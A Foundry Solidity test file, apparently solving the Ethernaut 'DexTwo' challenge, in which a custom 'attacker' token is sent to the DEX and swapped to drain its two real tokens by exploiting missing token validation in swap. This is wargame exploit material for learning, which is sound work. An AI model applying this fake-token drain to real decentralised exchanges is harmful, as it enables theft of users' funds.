// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.12;

import "forge-std/test.sol";
import {DexTwo} from "../src/DexTwo.sol";
import {DexTwoTokenAttacker} from "../src/DexTwoTokenAttacker.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexTwoTest is Test {
    DexTwo public dexTwo;
    DexTwoTokenAttacker public randomToken;

    address public owner = makeAddr("owner");
    address public token1 = makeAddr("token1");
    address public token2 = makeAddr("token2");

    function setUp() public {
        vm.startPrank(owner);
        dexTwo = new DexTwo(token1, token2);
        randomToken = new DexTwoTokenAttacker();
        vm.stopPrank();
    }

    function testDrainDexTwo() public {
        vm.startPrank(owner);
        randomToken.sendTokenstoDex(address(dexTwo));
        // we send 100 tokens to dexTwo
        // assertEq(IERC20(address(randomToken)).balanceOf(address(dexTwo)), 100);
        // assertEq(IERC20(address(randomToken)).balanceOf(owner), 999900);
        randomToken.approve(address(dexTwo), 300);
        assertEq(IERC20(address(randomToken)).allowance(owner, address(dexTwo)), 300);
        dexTwo.swap(address(randomToken), token1, 100);
        dexTwo.swap(address(randomToken), token2, 200);
        // dexTwo.swap(token1, token2, 100);
    }
}
